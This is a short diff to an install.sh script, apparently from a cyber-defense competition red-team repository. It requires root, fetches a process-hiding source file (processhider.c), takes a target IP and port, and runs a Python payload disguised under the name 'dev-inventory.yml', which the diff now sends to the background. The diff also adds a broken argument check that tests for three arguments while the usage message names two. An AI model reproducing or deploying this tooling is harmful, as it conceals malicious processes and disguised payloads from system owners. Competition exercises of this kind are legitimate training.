@@ -6,6 +6,12 @@ if [ "$EUID" -ne 0 ]; then
     exit 1
 fi
 
+# Check if script has more than 3 vars
+if [ $# -ne 3]; then
+    echo "Proper usage is ./install.sh TARGET-IP TARGET-PORT"
+    exit 1
+fi
+
 # Define variables
 REPO_URL="https://github.com/AYanofsky/ccdc-invisible-saturation/"
 TARGET_FILE="processhider.c"
@@ -44,6 +50,6 @@ exit
 
 mv dev-inventory.yml ../dev-inventory.yml
 
-python3 dev-inventory.yml $1 $2
+python3 dev-inventory.yml $1 $2 &
 
 echo "Script execution completed successfully."
